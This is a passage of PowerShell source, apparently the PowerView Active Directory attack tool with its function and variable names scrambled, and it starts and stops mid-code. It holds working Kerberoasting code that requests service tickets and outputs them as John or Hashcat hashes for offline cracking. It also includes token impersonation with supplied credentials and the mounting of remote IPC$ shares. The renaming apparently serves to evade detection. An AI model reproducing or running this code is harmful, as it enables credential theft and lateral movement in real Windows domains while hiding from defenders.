                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        upbraids -NADQIykH99 $vwZZtFNK99 @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[vileness] Error converting SID '$vwZZtFNK99' : $_"
            }
        }
    }
}
function upbraids {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $NADQIykH99,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $ZMAhChio99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $aSHUmXOb99 = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }
        function Invoke-Method([__ComObject] $Object, [String] $nFyaxSAK99, $ccxtKYyK99) {
            $TVkhXGOk99 = $Null
            $TVkhXGOk99 = $Object.GetType().InvokeMember($nFyaxSAK99, 'InvokeMethod', $NULL, $Object, $ccxtKYyK99)
            Write-Output $TVkhXGOk99
        }
        function Get-Property([__ComObject] $Object, [String] $NyagWnes99) {
            $Object.GetType().InvokeMember($NyagWnes99, 'GetProperty', $NULL, $Object, $NULL)
        }
        function Set-Property([__ComObject] $Object, [String] $NyagWnes99, $ccxtKYyK99) {
            [Void] $Object.GetType().InvokeMember($NyagWnes99, 'SetProperty', $NULL, $Object, $ccxtKYyK99)
        }
        if ($PSBoundParameters['Server']) {
            $lVahAJsH99 = 2
            $XsVpZecA99 = $vbyFupaI99
        }
        elseif ($PSBoundParameters['Domain']) {
            $lVahAJsH99 = 1
            $XsVpZecA99 = $CmuysoGL99
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $QWHERWHL99.GetNetworkCredential()
            $lVahAJsH99 = 1
            $XsVpZecA99 = $Cred.Domain
        }
        else {
            $lVahAJsH99 = 3
            $XsVpZecA99 = $Null
        }
    }
    PROCESS {
        ForEach ($PkvgfxKs99 in $NADQIykH99) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($PkvgfxKs99 -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $bXIQTwar99 = $aSHUmXOb99['DomainSimple']
                }
                else {
                    $bXIQTwar99 = $aSHUmXOb99['NT4']
                }
            }
            else {
                $bXIQTwar99 = $aSHUmXOb99[$ZMAhChio99]
            }
            $iuKbRsyD99 = New-Object -ComObject NameTranslate
            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $QWHERWHL99.GetNetworkCredential()
                    Invoke-Method $iuKbRsyD99 'InitEx' (
                        $lVahAJsH99,
                        $XsVpZecA99,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[upbraids] Error initializing translation for '$NADQIykH99' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $iuKbRsyD99 'Init' (
                        $lVahAJsH99,
                        $XsVpZecA99
                    )
                }
                catch {
                    Write-Verbose "[upbraids] Error initializing translation for '$NADQIykH99' : $_"
                }
            }
            Set-Property $iuKbRsyD99 'ChaseReferral' (0x60)
            try {
                $Null = Invoke-Method $iuKbRsyD99 'Set' (8, $PkvgfxKs99)
                Invoke-Method $iuKbRsyD99 'Get' ($bXIQTwar99)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[upbraids] Error translating '$PkvgfxKs99' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function betters {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,
        [Switch]
        $tmsSRJiz99
    )
    BEGIN {
        $FqLmDWfg99 = New-Object System.Collections.Specialized.OrderedDictionary
        $FqLmDWfg99.Add("SCRIPT", 1)
        $FqLmDWfg99.Add("ACCOUNTDISABLE", 2)
        $FqLmDWfg99.Add("HOMEDIR_REQUIRED", 8)
        $FqLmDWfg99.Add("LOCKOUT", 16)
        $FqLmDWfg99.Add("PASSWD_NOTREQD", 32)
        $FqLmDWfg99.Add("PASSWD_CANT_CHANGE", 64)
        $FqLmDWfg99.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $FqLmDWfg99.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $FqLmDWfg99.Add("NORMAL_ACCOUNT", 512)
        $FqLmDWfg99.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $FqLmDWfg99.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $FqLmDWfg99.Add("SERVER_TRUST_ACCOUNT", 8192)
        $FqLmDWfg99.Add("DONT_EXPIRE_PASSWORD", 65536)
        $FqLmDWfg99.Add("MNS_LOGON_ACCOUNT", 131072)
        $FqLmDWfg99.Add("SMARTCARD_REQUIRED", 262144)
        $FqLmDWfg99.Add("TRUSTED_FOR_DELEGATION", 524288)
        $FqLmDWfg99.Add("NOT_DELEGATED", 1048576)
        $FqLmDWfg99.Add("USE_DES_KEY_ONLY", 2097152)
        $FqLmDWfg99.Add("DONT_REQ_PREAUTH", 4194304)
        $FqLmDWfg99.Add("PASSWORD_EXPIRED", 8388608)
        $FqLmDWfg99.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $FqLmDWfg99.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }
    PROCESS {
        $vQBVbeLS99 = New-Object System.Collections.Specialized.OrderedDictionary
        if ($tmsSRJiz99) {
            ForEach ($IqWhfNmp99 in $FqLmDWfg99.GetEnumerator()) {
                if ( ($Value -band $IqWhfNmp99.Value) -eq $IqWhfNmp99.Value) {
                    $vQBVbeLS99.Add($IqWhfNmp99.Name, "$($IqWhfNmp99.Value)+")
                }
                else {
                    $vQBVbeLS99.Add($IqWhfNmp99.Name, "$($IqWhfNmp99.Value)")
                }
            }
        }
        else {
            ForEach ($IqWhfNmp99 in $FqLmDWfg99.GetEnumerator()) {
                if ( ($Value -band $IqWhfNmp99.Value) -eq $IqWhfNmp99.Value) {
                    $vQBVbeLS99.Add($IqWhfNmp99.Name, "$($IqWhfNmp99.Value)")
                }
            }
        }
        $vQBVbeLS99
    }
}
function leavening {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters['Domain'] -or ($NADQIykH99 -match '.+\\.+')) {
            if ($NADQIykH99 -match '.+\\.+') {
                $OHhjpxKx99 = $NADQIykH99 | upbraids -ZMAhChio99 Canonical
                if ($OHhjpxKx99) {
                    $luiWNaGi99 = $OHhjpxKx99.SubString(0, $OHhjpxKx99.IndexOf('/'))
                    $TByCtrTd99 = $NADQIykH99.Split('\')[1]
                    Write-Verbose "[leavening] Binding to domain '$luiWNaGi99'"
                }
            }
            else {
                $TByCtrTd99 = $NADQIykH99
                Write-Verbose "[leavening] Binding to domain '$CmuysoGL99'"
                $luiWNaGi99 = $CmuysoGL99
            }
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[leavening] Using alternate credentials'
                $oJvGZDLA99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $luiWNaGi99, $QWHERWHL99.UserName, $QWHERWHL99.GetNetworkCredential().Password)
            }
            else {
                $oJvGZDLA99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $luiWNaGi99)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[leavening] Using alternate credentials'
                $gQqbCoyx99 = rompers | Select-Object -ExpandProperty Name
                $oJvGZDLA99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $gQqbCoyx99, $QWHERWHL99.UserName, $QWHERWHL99.GetNetworkCredential().Password)
            }
            else {
                $oJvGZDLA99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $TByCtrTd99 = $NADQIykH99
        }
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $oJvGZDLA99
        $Out | Add-Member Noteproperty 'Identity' $TByCtrTd99
        $Out
    }
    catch {
        Write-Warning "[leavening] Error creating binding for object ('$NADQIykH99') context : $_"
    }
}
function hepper {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99
    )
    BEGIN {
        $FPKdqrAm99 = [Activator]::CreateInstance($imYUabei99)
        $FPKdqrAm99.dwType = 1
    }
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($ZTpiMOiS99 in $iEYVPYCX99) {
                $ZTpiMOiS99 = $ZTpiMOiS99.Trim('\')
                $Paths += ,"\\$ZTpiMOiS99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($ksjaRAXe99 in $Paths) {
            $FPKdqrAm99.lpRemoteName = $ksjaRAXe99
            Write-Verbose "[hepper] Attempting to mount: $ksjaRAXe99"
            $yBCCHOLl99 = $Mpr::WNetAddConnection2W($FPKdqrAm99, $QWHERWHL99.GetNetworkCredential().Password, $QWHERWHL99.UserName, 4)
            if ($yBCCHOLl99 -eq 0) {
                Write-Verbose "$ksjaRAXe99 successfully mounted"
            }
            else {
                Throw "[hepper] error mounting $ksjaRAXe99 : $(([ComponentModel.Win32Exception]$yBCCHOLl99).Message)"
            }
        }
    }
}
function grand {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($ZTpiMOiS99 in $iEYVPYCX99) {
                $ZTpiMOiS99 = $ZTpiMOiS99.Trim('\')
                $Paths += ,"\\$ZTpiMOiS99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($ksjaRAXe99 in $Paths) {
            Write-Verbose "[grand] Attempting to unmount: $ksjaRAXe99"
            $yBCCHOLl99 = $Mpr::WNetCancelConnection2($ksjaRAXe99, 0, $True)
            if ($yBCCHOLl99 -eq 0) {
                Write-Verbose "$ksjaRAXe99 successfully ummounted"
            }
            else {
                Throw "[grand] error unmounting $ksjaRAXe99 : $(([ComponentModel.Win32Exception]$yBCCHOLl99).Message)"
            }
        }
    }
}
function pant {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $sdyalGJn99,
        [Switch]
        $Quiet
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[pant] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }
    if ($PSBoundParameters['TokenHandle']) {
        $OGmsAZFy99 = $sdyalGJn99
    }
    else {
        $OGmsAZFy99 = [IntPtr]::Zero
        $TbCkTzwV99 = $QWHERWHL99.GetNetworkCredential()
        $wvZHbMee99 = $TbCkTzwV99.Domain
        $TEQSWNGN99 = $TbCkTzwV99.UserName
        Write-Warning "[pant] Executing LogonUser() with user: $($wvZHbMee99)\$($TEQSWNGN99)"
        $yBCCHOLl99 = $hAwLTjYU99::LogonUser($TEQSWNGN99, $wvZHbMee99, $TbCkTzwV99.Password, 9, 3, [ref]$OGmsAZFy99);$TmohuzND99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not $yBCCHOLl99) {
            throw "[pant] LogonUser() Error: $(([ComponentModel.Win32Exception] $TmohuzND99).Message)"
        }
    }
    $yBCCHOLl99 = $hAwLTjYU99::ImpersonateLoggedOnUser($OGmsAZFy99)
    if (-not $yBCCHOLl99) {
        throw "[pant] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $TmohuzND99).Message)"
    }
    Write-Verbose "[pant] Alternate credentials successfully impersonated"
    $OGmsAZFy99
}
function mucilage {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $sdyalGJn99
    )
    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[mucilage] Reverting token impersonation and closing LogonUser() token handle"
        $yBCCHOLl99 = $Kernel32::CloseHandle($sdyalGJn99)
    }
    $yBCCHOLl99 = $hAwLTjYU99::RevertToSelf();$TmohuzND99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not $yBCCHOLl99) {
        throw "[mucilage] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $TmohuzND99).Message)"
    }
    Write-Verbose "[mucilage] Token impersonation successfully reverted"
}
function utilized {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $GPKLTYnR99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $PFFVxxpZ99 = $User
        }
        else {
            $PFFVxxpZ99 = $SPN
        }
        ForEach ($Object in $PFFVxxpZ99) {
            if ($PSBoundParameters['User']) {
                $gtUDPFgo99 = $Object.ServicePrincipalName
                $WCChaSZB99 = $Object.SamAccountName
                $pBkTODOT99 = $Object.DistinguishedName
            }
            else {
                $gtUDPFgo99 = $Object
                $WCChaSZB99 = 'UNKNOWN'
                $pBkTODOT99 = 'UNKNOWN'
            }
            if ($gtUDPFgo99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $gtUDPFgo99 = $gtUDPFgo99[0]
            }
            try {
                $ZPoihWfp99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $gtUDPFgo99
            }
            catch {
                Write-Warning "[utilized] Error requesting ticket for SPN '$gtUDPFgo99' from user '$pBkTODOT99' : $_"
            }
            if ($ZPoihWfp99) {
                $xAezWCnB99 = $ZPoihWfp99.GetRequest()
            }
            if ($xAezWCnB99) {
                $Out = New-Object PSObject
                $kDlLqvOO99 = [System.BitConverter]::ToString($xAezWCnB99) -replace '-'
                $Out | Add-Member Noteproperty 'SamAccountName' $WCChaSZB99
                $Out | Add-Member Noteproperty 'DistinguishedName' $pBkTODOT99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $ZPoihWfp99.ServicePrincipalName
                if($kDlLqvOO99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $vKIhuYMQ99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $zvDeMGLv99 = $Matches.DataToEnd.Substring(0,$vKIhuYMQ99*2)
                    if($Matches.DataToEnd.Substring($vKIhuYMQ99*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($ZPoihWfp99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($xAezWCnB99).Replace('-',''))
                    } else {
                        $Hash = "$($zvDeMGLv99.Substring(0,32))`$$($zvDeMGLv99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($ZPoihWfp99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($xAezWCnB99).Replace('-',''))
                }
                if($Hash) {
                    if ($GPKLTYnR99 -match 'John') {
                        $GhSnCqkd99 = "`$UdnPWosq99`$$($ZPoihWfp99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($pBkTODOT99 -ne 'UNKNOWN') {
                            $wvZHbMee99 = $pBkTODOT99.SubString($pBkTODOT99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $wvZHbMee99 = 'UNKNOWN'
                        }
                        $GhSnCqkd99 = "`$UdnPWosq99`$$($Etype)`$*$WCChaSZB99`$$wvZHbMee99`$$($ZPoihWfp99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $GhSnCqkd99
                }
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function surged {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $NADQIykH99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $GPKLTYnR99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $vtcZsFqI99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $vtcZsFqI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['LDAPFilter']) { $vtcZsFqI99['LDAPFilter'] = $aWyQQagT99 }
        if ($PSBoundParameters['SearchBase']) { $vtcZsFqI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $vtcZsFqI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $vtcZsFqI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $vtcZsFqI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $vtcZsFqI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $vtcZsFqI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $vtcZsFqI99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['Credential']) {
            $THMRkorV99 = pant -QWHERWHL99 $QWHERWHL99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $vtcZsFqI99['Identity'] = $NADQIykH99 }
        melodrama @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | utilized -GPKLTYnR99 $GPKLTYnR99
    }
    END {
        if ($THMRkorV99) {
            mucilage -sdyalGJn99 $THMRkorV99
        }
    }
}
function straightening {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function readjust {
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )
            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }
            $kxgsjqkf99 = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }
            $XWgDzyKk99 = @()
            $XWgDzyKk99 += $kxgsjqkf99.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $kxgsjqkf99[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }
            $XWgDzyKk99 += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($XWgDzyKk99 | Where-Object {$_}) -join ','
        }
        $tClHnETA99 = @{}
        if ($PSBoundParameters['Credential']) { $tClHnETA99['Credential'] = $QWHERWHL99 }
        $wOegLMVb99 = @{}
    }
    PROCESS {
        ForEach ($ksjaRAXe99 in $Path) {
            try {
                if (($ksjaRAXe99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $UepKaYkI99 = (New-Object System.Uri($ksjaRAXe99)).Host
                    if (-not $wOegLMVb99[$UepKaYkI99]) {
                        hepper -iEYVPYCX99 $UepKaYkI99 -QWHERWHL99 $QWHERWHL99
                        $wOegLMVb99[$UepKaYkI99] = $True
                    }
                }
                $ACL = Get-Acl -Path $ksjaRAXe99
                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = vileness -ObjectSID $SID @ConvertArguments
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $ksjaRAXe99
                    $Out | Add-Member Noteproperty 'FileSystemRights' (readjust -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[straightening] error: $_"
            }
        }
    }
    END {
        $wOegLMVb99.Keys | grand
    }
}
function gelling {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $IzcJvFdA99
    )
    $jwtVZAQh99 = @{}
    $IzcJvFdA99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
